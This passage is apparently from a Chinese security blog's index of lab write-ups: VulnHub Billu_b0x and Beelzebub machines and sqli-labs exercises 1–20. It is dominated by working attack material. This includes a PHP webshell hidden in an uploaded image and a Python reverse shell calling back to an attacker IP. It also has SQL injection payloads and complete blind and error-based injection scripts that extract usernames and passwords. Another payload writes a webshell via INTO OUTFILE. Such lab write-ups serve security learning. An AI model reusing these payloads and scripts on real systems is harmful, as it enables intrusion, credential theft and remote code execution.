(move_uploaded_file($_FILES['image']['tmp_name'], 'uploaded_images/'.$_FILES['image']['name'])) { echo \"Uploaded successfully \"; $update='insert into users(name,address,image,id) values(\\''.$name.'\\',\\''.$address.'\\',\\''.$iname.'\\', \\''.$id.'\\')'; mysqli_query($conn, $update); } } else { echo \"\u003cbr\u003ei told you dear, only png,jpg and gif file are allowed\"; } } else { echo \"\u003cbr\u003eonly png,jpg and gif file are allowed\"; } } } ?\u003e include($dir.'/'.$_POST['load']);存在文件包含,上传一张带有webshell的图片即可 echo \"\u003c?php file_put_contents('uploaded_images/shell.php','\u003c?php eval(\\$_POST[a]);?\u003e')?\u003e\" \u003e\u003e jack.jpg ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:3:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"获取user权限 在uploaded_images/shell.php中得到一个webshell 存在python2的环境,利用python2反弹shell import socket import subprocess import os ip=\"172.20.2.128\" port=9999 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((ip,port)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); 有时候在使用nc -lvvp时会报错nc: getnameinfo: Temporary failure in name resolution 此时应该添加n参数,即nc -lvnp ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:4:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"获取root权限 使用CVE-2015-1328进行提权 ","date":"2021-11-04","objectID":"/vulnhub-billu_b0x/:5:0","tags":null,"title":"VulnHub-Billu_b0x","uri":"/vulnhub-billu_b0x/"},{"categories":["VulnHub"],"content":"前期工作 dirsearch显示index.php返回200,但是在浏览器打开index.php返回404 NOT FOUND 查看网页源码显示 \u003chtml\u003e\u003chead\u003e \u003ctitle\u003e404 Not Found\u003c/title\u003e \u003c/head\u003e\u003cbody\u003e \u003ch1\u003eNot Found\u003c/h1\u003e \u003c!--My heart was encrypted, \"beelzebub\" somehow hacked and decoded it.-md5--\u003e \u003cp\u003eThe requested URL was not found on this server.\u003c/p\u003e \u003chr\u003e \u003caddress\u003eApache/2.4.30 (Ubuntu)\u003c/address\u003e \u003c/body\u003e\u003c/html\u003e 对beelzebub计算md5 echo -n beelzebub | md5sum 返回d18e1e22becbd915b45e0e655429d487 尝试以beelzebub作为用户名,d18e1e22becbd915b45e0e655429d487作为密码进行ssh连接但是ssh连接失败 对路径d18e1e22becbd915b45e0e655429d487的扫描结果如下 [23:53:07] 403 - 278B - /d18e1e22becbd915b45e0e655429d487//.htaccess [23:53:07] 403 - 278B - /d18e1e22becbd915b45e0e655429d487//.htpasswd [23:53:07] 301 - 0B - /d18e1e22becbd915b45e0e655429d487//?m=a -\u003e http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/?m=a [23:53:08] 200 - 58KB - /d18e1e22becbd915b45e0e655429d487//?s=d [23:53:08] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//?wp-html-rend [23:53:08] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//?pageservices [23:53:12] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//index.php/ [23:53:12] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//index.php?chemin=..%2f..%2f..%2f..%2f..%2f..%2f%2fetc [23:53:12] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//index.php?file=../../../../../../etc/passwd [23:53:12] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//index.php?file=/etc/passwd [23:53:12] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487//index.php?page=../../../../etc/passwd [23:53:18] 200 - 56KB - /d18e1e22becbd915b45e0e655429d487/index.php [23:53:27] 200 - 45KB - /d18e1e22becbd915b45e0e655429d487/wp-includes/ [23:53:27] 200 - 7KB - /d18e1e22becbd915b45e0e655429d487/readme.html [23:53:27] 200 - 19KB - /d18e1e22becbd915b45e0e655429d487/license.txt [23:53:41] 302 - 0B - /d18e1e22becbd915b45e0e655429d487/wp-admin/ -\u003e http://192.168.1.6/d18e1e22becbd915b45e0e655429d487/wp-login.php?redirect_to=http%3A%2F%2F192.168.148.7%2Fd18e1e22becbd915b45e0e655429d487%2Fwp-admin%2F\u0026reauth=1 [23:53:44] 301 - 350B - /d18e1e22becbd915b45e0e655429d487/wp-admin -\u003e http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/wp-admin/ [23:53:57] 200 - 0B - /d18e1e22becbd915b45e0e655429d487/wp-config.php [23:53:57] 301 - 352B - /d18e1e22becbd915b45e0e655429d487/wp-content -\u003e http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/wp-content/ [23:53:57] 200 - 0B - /d18e1e22becbd915b45e0e655429d487/wp-content/ [23:53:57] 301 - 353B - /d18e1e22becbd915b45e0e655429d487/wp-includes -\u003e http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/wp-includes/ [23:53:57] 200 - 6KB - /d18e1e22becbd915b45e0e655429d487/wp-login.php ","date":"2021-10-31","objectID":"/vulnhub-beelzebub/:1:0","tags":null,"title":"VulnHub-Beelzebub","uri":"/vulnhub-beelzebub/"},{"categories":["VulnHub"],"content":"分析wordpress结构 显示其可能为wordpress的后台,使用wpscan对其进行扫描,检测其是否存在漏洞 docker run -it --rm wpscanteam/wpscan --url http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force vp [+] XML-RPC seems to be enabled: http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ ... [+] valak | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] krampus | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) dirsearch显示存在/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/路径 http://192.168.148.7/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/Talk%20To%20VALAK/存在一个特殊的网页 传入数据后,发现返回的数据包中含有password,M4k3Ad3a1 ","date":"2021-10-31","objectID":"/vulnhub-beelzebub/:2:0","tags":null,"title":"VulnHub-Beelzebub","uri":"/vulnhub-beelzebub/"},{"categories":["VulnHub"],"content":"爆破ssh获取usre权限 测试得知该密码为ssh密码,对应用户为krampus ","date":"2021-10-31","objectID":"/vulnhub-beelzebub/:3:0","tags":null,"title":"VulnHub-Beelzebub","uri":"/vulnhub-beelzebub/"},{"categories":["VulnHub"],"content":"获取root权限 用linux-exploit-suggester检测,发现存在CVE-2021-3156 使用该exp https://github.com/worawit/CVE-2021-3156 对CVE-2021-3156进行利用 而在writeup中还提到可以使用[CVE-2019-12181] Serv-U FTP Server进行提权 https://github.com/guywhataguy/CVE-2019-12181 ","date":"2021-10-31","objectID":"/vulnhub-beelzebub/:4:0","tags":null,"title":"VulnHub-Beelzebub","uri":"/vulnhub-beelzebub/"},{"categories":["靶场"],"content":"在mysql中有一个系统数据库information_schema存储着所有的数据库的相关信息 查询数据库名 select schema_name from information_schema.schemata 查询数据表 select table_name from information_schema.tables where table_schema='xxx' 查询列 select column_name from information_schema.columns where table_name='xxx' ","date":"2021-10-25","objectID":"/sqli-labs/:0:0","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Basic Challenges ","date":"2021-10-25","objectID":"/sqli-labs/:1:0","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-1 传入?id=1'得到报错''1'' LIMIT 0,1',说明原本的sql语句为'$id' LIMIT 0,1,但是此时$id多了一个'造成了'没有完全匹配,利用注释将后面多余的'去除 传入?id=1'--%20此时的sql语句变为'1'-- LIMIT 0,1此时后面的LIMIT 0,1已经被注释掉了,同时'已经完全匹配所以sql语句正确执行 使用order by进行排序,?id=1' order by 4--%20当传入4时报错Unknown column '4' in 'order clause'说明只有3列数据 利用group_concat列出所有数据库名 ?id=-1' UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20 列出表名?id=-1' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20 查询列?id=-1' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20 列出所有数据?id=-1' UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20 ","date":"2021-10-25","objectID":"/sqli-labs/:1:1","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-2 传入?id=1'报错'' LIMIT 0,1',传入?id='1报错''1 LIMIT 0,1',推测sql语句为$id LIMIT 0,1(没有') 爆破库名?id=-1 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20 爆破表名?id=-1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20 查询列?id=-1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20 列出所有数据?id=-1 UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20 ","date":"2021-10-25","objectID":"/sqli-labs/:1:2","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-3 传入?id=1'报错''1'') LIMIT 0,1',推测sql语句为('$id') LIMIT 0,1 爆破库名?id=-1') UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20 爆破表名?id=-1') UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20 查询列?id=-1') UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20 列出所有数据?id=-1') UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20 ","date":"2021-10-25","objectID":"/sqli-labs/:1:3","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-4 传入?id=1'无回显,传入?id-1\"报错\"1\"\") LIMIT 0,1,推测sql语句为(\"$id\") LIMIT 0,1 爆破库名?id=-1\") UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--%20 爆破表名?id=-1\") UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--%20 查询列?id=-1\") UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--%20 列出所有数据?id=-1\") UNION SELECT 1,(select group_concat(username)),(select group_concat(password)) from users--%20 ","date":"2021-10-25","objectID":"/sqli-labs/:1:4","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-5 传入?id=1'报错''1'' LIMIT 0,1',而传入?id=1' or 1=1--%20则会返回You are in,不返回查询结果因此这里可以进行布尔盲注 #二分法爆破 import requests import time url = 'http://127.0.0.1/Less-5/' def get_database_length(): # 长度为8 for i in range(50): payload = \"?id=-1' or length(database())=%d-- \" % i r = requests.get(url + payload) if \"You are in\" in r.text: return i time.sleep(0.1) def get_database_name(database_length): # security for i in range(1, database_length + 1): low = 32 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1' or ascii(substr(database(),%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"You are in\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) print(chr(mid), end=\"\") print() def get_table_name(): # users,uagents,emails,referers for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1' or ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"You are in\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: return print(chr(mid), end=\"\") print() def get_column_name(): # id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1' or ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"You are in\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_username(): for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1' or ascii(substr((select binary group_concat(username) from users) ,%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"You are in\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_password(): for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=-1' or ascii(substr((select binary group_concat(password) from users) ,%d,1))\u003e%d-- \" % (i, mid) r = requests.get(url + payload) if \"You are in\" in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") get_username() get_password() Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 也可以进行报错注入 利用updatexml函数(该函数对输出的字符长度做了限制,其最长输出32位) 传入?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),1,20) from information_schema.schemata),0x7e),1)--%20 返回XPATH syntax error: '~information_schema,m~' import requests import re url = \"http://127.0.0.1/Less-5/\" def get_database_name(): rule = r\"'~(.+?)~'\" text = \"\" for i in range(1, 100, 20): payload = \"?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),%d,20) from information_schema.schemata),0x7e),1)-- \" % i r = requests.get(url + payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_table_name(): rule = r\"'~(.+?)~'\" text = \"\" for i in range(1, 100, 20): payload = \"?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),%d,20) from information_schema.tables where table_schema='security'),0x7e),1)-- \" % i r = requests.get(url + payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_column_name(): rule = r\"'~(.+?)~'\" text = \"\" for i in range(1, 100, 20): payload = \"?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),%d,20) from information_schema.columns where table_name='users'),0x7e),1)-- \" % i r = requests.get(url + payloa","date":"2021-10-25","objectID":"/sqli-labs/:1:5","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-6 把Less-5的单引号改成双引号 ","date":"2021-10-25","objectID":"/sqli-labs/:1:6","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-7 传入?id=1,返回You are in.... Use outfile......提示使用导出数据到文件的方式来进行注入 传入?id=1',返回You have an error in your SQL syntax,传入?id=1' or 1=1--%20,仍然返回You have an error in your SQL syntax 测试得出的正确闭合方式为?id=1')) or 1=1--%20 使用Less-5的二分法爆破 利用outfile将查询结果写入文件,同时可以写shell (此处需要对mysql进行配置) docker exec -it xxx bash进入容器 mysql -e \"show global variables like 'secure_file_priv';\"检查secure-file-priv当前的值是否为空(不是NULL) root@2fef8c08e970:/# mysql -e \"show global variables like 'secure_file_priv';\" +------------------+-------+ | Variable_name | Value | +------------------+-------+ | secure_file_priv | | +------------------+-------+ 同时在/var/www/html添加可写权限 传入?id=1')) union select 1,2,'\u003c?php eval($_POST[_]);?\u003e' into outfile \"/var/www/html/shell.php\" --%20 ","date":"2021-10-25","objectID":"/sqli-labs/:1:7","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-8 传入?id=1'无回显,传入?id=1' or 1=1--%20回显You are in........... 脚本同Less-5 ","date":"2021-10-25","objectID":"/sqli-labs/:1:8","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-9 无论传入什么都是返回You are in...........,根据提示闭合符号为'并’使用延时盲注 import requests import time url = \"http://127.0.0.1/Less-9/\" def get_database_length(): for i in range(50): payload = \"?id=1' and if(length(database())=%d,sleep(5),1)-- \" % i try: requests.get(url + payload, timeout=1) except Exception: return i time.sleep(0.1) def get_database_name(database_length): for i in range(1, database_length + 1): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=1' and if(ascii(substr(database(),%d,1))\u003e%d,sleep(5),1)-- \" % (i, mid) try: requests.get(url + payload, timeout=1) except Exception: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) print(chr(mid), end=\"\") print() def get_table_name(): for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=1' and if(ascii(substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) ,%d,1))\u003e%d,sleep(5),1)-- \" % (i, mid) try: r = requests.get(url + payload, timeout=1) except Exception: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_column_name(): # id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=1' and if(ascii(substr((select binary group_concat(column_name) from information_schema.columns where table_name='users') ,%d,1))\u003e%d,sleep(5),1)-- \" % (i, mid) try: r = requests.get(url + payload, timeout=1) except Exception: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_username(): for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=1' and if(ascii(substr((select binary group_concat(username) from users) ,%d,1))\u003e%d,sleep(5),1)-- \" % (i, mid) try: r = requests.get(url + payload, timeout=1) except Exception: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_password(): for i in range(1, 100): low = 31 high = 128 mid = (low + high) // 2 while high \u003e low: payload = \"?id=1' and if(ascii(substr((select binary group_concat(password) from users),%d,1))\u003e%d,sleep(5),1)-- \" % (i, mid) try: r = requests.get(url + payload, timeout=1) except Exception: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") get_database_name(get_database_length()) get_table_name() get_column_name() get_username() get_password() ","date":"2021-10-25","objectID":"/sqli-labs/:1:9","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-10 将Less-9的单引号改成双引号 ","date":"2021-10-25","objectID":"/sqli-labs/:1:10","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-11 POST传参uname=admin'\u0026passwd=asdf 返回You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf' LIMIT 0,1' at line 1 推测其闭合方式为'$uname' and '$passwd' @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysqli_query($con, $sql); $row=mysqli_fetch_array($result, MYSQLI_BOTH); POST传参1' or 1=1;# 构成查询语句SELECT username, password FROM users WHERE username='1' or 1=1;#' and password='123' LIMIT 0,1 mysqli_fetch_array限制返回的行数 传入uname=1' or 1=1 order by 3#\u0026passwd=123得到Unknown column '3' in 'order clause'可知一共两列 传入uname=1' and 1=1 union select database(),1#\u0026passwd=123得到Your Login name:security 注意这里传入的是and,如果仍然传入or会返回Your Login name:Dumb 传入uname=1' and 1=1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#\u0026passwd=123 返回Your Password:users,uagents,emails,referers 传入uname=1' and 1=1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'#\u0026passwd=123 返回Your Password:id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 传入uname=1' and 1=1 union select 1,group_concat(username) from users#\u0026passwd=123 返回Your Password:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 传入uname=1' and 1=1 union select 1,group_concat(password) from users#\u0026passwd=123 返回Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 ","date":"2021-10-25","objectID":"/sqli-labs/:1:11","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-12 把Less-11的单引号换成\") ","date":"2021-10-25","objectID":"/sqli-labs/:1:12","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-13 传入uname=1')\u0026passwd=123 返回You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '') and password=('123') LIMIT 0,1' at line 1 传入uname=1') or 1=1#\u0026passwd=123返回的Content-Length为1493 传入uname=1') or 1=2#\u0026passwd=123返回的Content-Length为1454 由此可以进行布尔盲注 import requests import time url = \"http://127.0.0.1/Less-13/\" # len(r.text) correct 1493 error 1454 def get_database_length(): for i in range(50): payload = {\"uname\": \"1') or length(database())=%d#\" % i, \"passwd\": \"123\", \"submit\": \"submit\"} r = requests.post(url=url, data=payload) if len(r.text) == 1493: return i time.sleep(0.1) def get_database_name(database_length): for i in range(1, database_length + 1): low = 31 high = 127 mid = (low + high) // 2 while low \u003c high: payload = {\"uname\": \"1') or ascii(substr(database(),%d,1))\u003e%d#\" % (i, mid), \"passwd\": \"123\", \"submit\": \"submit\"} r = requests.post(url=url, data=payload) if len(r.text) == 1493: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) print(chr(mid), end=\"\") print() def get_table_name(): for i in range(1, 50): low = 31 high = 127 mid = (low + high) // 2 while low \u003c high: payload = { \"uname\": \"1') or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))\u003e%d#\" % (i, mid), \"passwd\": \"123\", \"submit\": \"submit\" } r = requests.post(url=url, data=payload) if len(r.text) == 1493: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_column_name(): for i in range(1, 100): low = 31 high = 127 mid = (low + high) // 2 while low \u003c high: payload = { \"uname\": \"1') or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))\u003e%d#\" % (i, mid), \"passwd\": \"123\", \"submit\": \"submit\" } r = requests.post(url=url, data=payload) if len(r.text) == 1493: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_username(): for i in range(1, 100): low = 31 high = 127 mid = (low + high) // 2 while low \u003c high: payload = {\"uname\": \"1') or ascii(substr((select group_concat(username) from users),%d,1))\u003e%d#\" % (i, mid), \"passwd\": \"123\", \"submit\": \"submit\"} r = requests.post(url=url, data=payload) if len(r.text) == 1493: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") def get_password(): for i in range(1, 100): low = 31 high = 127 mid = (low + high) // 2 while low \u003c high: payload = {\"uname\": \"1') or ascii(substr((select group_concat(password) from users),%d,1))\u003e%d#\" % (i, mid), \"passwd\": \"123\", \"submit\": \"submit\"} r = requests.post(url=url, data=payload) if len(r.text) == 1493: low = mid + 1 else: high = mid mid = (low + high) // 2 time.sleep(0.1) if mid == 31: print() return print(chr(mid), end=\"\") get_database_name(get_database_length()) get_table_name() get_column_name() get_username() get_password() ","date":"2021-10-25","objectID":"/sqli-labs/:1:13","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-14 把Less-13的单引号换成双引号 ","date":"2021-10-25","objectID":"/sqli-labs/:1:14","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-15 对传入的参数不进行错误回显,传入uname=1' or 1=1#\u0026passwd=1得到Content-Length为1492并提示登录成功 传入uname=1' or 1=2#\u0026passwd=1得到Content-Length为1446并提示登录失败 可知闭合方式为',脚本同Less-13 ","date":"2021-10-25","objectID":"/sqli-labs/:1:15","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-16 把Less-15的单引号换成\") ","date":"2021-10-25","objectID":"/sqli-labs/:1:16","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-17 传入uname=admin\u0026passwd=1'返回You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1 因此可以使用报错注入 提示: You can't specify target table 'users' for update in FROM clause不能select出表中某些值,再update这个表 解决方法: 再套一层循环,并对自循环的结果赋予别名 import requests import time import re url = \"http://127.0.0.1/Less-17/\" rule = r\"'~(.+?)~'\" def get_database_name(): text = \"\" for i in range(1, 100, 20): payload = {\"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(schema_name),%d,20) from information_schema.schemata),0x7e),1)#\" % i, \"submit\": \"Submit\"} r = requests.post(url=url, data=payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_table_name(): text = \"\" for i in range(1, 100, 20): payload = { \"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),%d,20) from information_schema.tables where table_schema='security'),0x7e),1)#\" % i, \"submit\": \"Submit\" } r = requests.post(url=url, data=payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_column_name(): text = \"\" for i in range(1, 100, 20): payload = { \"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),%d,20) from information_schema.columns where table_name='users'),0x7e),1)#\" % i, \"submit\": \"Submit\" } r = requests.post(url=url, data=payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_username(): text = \"\" for i in range(1, 100, 20): #err_payload = {\"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(username),%d,20) from users),0x7e),1)#\" % i, \"submit\": \"Submit\"} #You can't specify target table 'users' for update in FROM clause #err_payload = {\"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(username),%d,20) from (select username from users)),0x7e),1)#\" % i, \"submit\": \"Submit\"} #Every derived table must have its own alias payload = {\"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(username),%d,20) from (select username from users)abc),0x7e),1)#\" % i, \"submit\": \"Submit\"} r = requests.post(url=url, data=payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text def get_password(): text = \"\" for i in range(1, 100, 20): payload = {\"uname\": \"admin\", \"passwd\": \"1' and updatexml(1,concat(0x7e,(select substr(group_concat(password),%d,20) from (select password from users)abc),0x7e),1)#\" % i, \"submit\": \"Submit\"} r = requests.post(url=url, data=payload) tmp = re.findall(rule, r.text) if tmp: text += tmp[0] return text print(get_database_name()) print(get_table_name()) print(get_column_name()) print(get_username()) print(get_password()) ","date":"2021-10-25","objectID":"/sqli-labs/:1:17","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-18 登录回显发现uagent 在header中设置User-Agent: '回显You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1', 'admin')' at line 1 推测对uagent进行了保存,保存方式为value('$uagent','$ip','$uname') 设置headerUser-Agent: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1从而构成闭合 构成的sql语句为 INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1', '192.168.8.1', 'admin') 后面的注入与报错注入类似 ","date":"2021-10-25","objectID":"/sqli-labs/:1:18","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-19 登录回显发现referer 在header中设置Referer: '回显You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '192.168.8.1')' at line 1 推测对uagent进行了保存,保存方式为value('$referer','$ip') 设置headerReferer: ' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1从而构成闭合 构成的sql语句为 INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('' and updatexml(1,concat(0x7e,(length(database())),0x7e),1) and '1'='1', '192.168.8.1') 后面的注入与报错注入类似 ","date":"2021-10-25","objectID":"/sqli-labs/:1:19","tags":null,"title":"sqli-labs(已完成)","uri":"/sqli-labs/"},{"categories":["靶场"],"content":"Less-20 登录后返回 YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 YOUR IP ADDRESS IS : 192.168.8.1 DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE YOUR COOKIE : uname = admin and expires: Sat 08 May 2021 - 13:56:57 Your Login name:admin Your Password:admin Your ID:8 在header中设置Cookie: uname='asdf回显You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'asdf' LIMIT 